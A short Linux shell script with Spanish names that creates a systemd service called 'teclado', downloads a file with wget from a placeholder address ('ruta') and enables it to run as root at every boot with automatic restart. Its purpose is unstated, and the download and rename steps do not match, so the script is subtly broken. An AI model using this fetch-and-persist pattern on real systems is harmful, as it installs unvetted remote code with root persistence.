cd /etc/systemd/system/
echo "
[Unit]
Description=teclado
After=network-online.target

[Service]
Restart=always
ExecStart=/bin/bash /usr/local/bin/teclado
Group=root

[Install]
WantedBy=multi-user.target" > teclado.service
chmod +x teclado.service
cd /usr/local/bin/
wget ruta
chmod +x teclado
systemctl enable teclado.service
systemctl start teclado.service
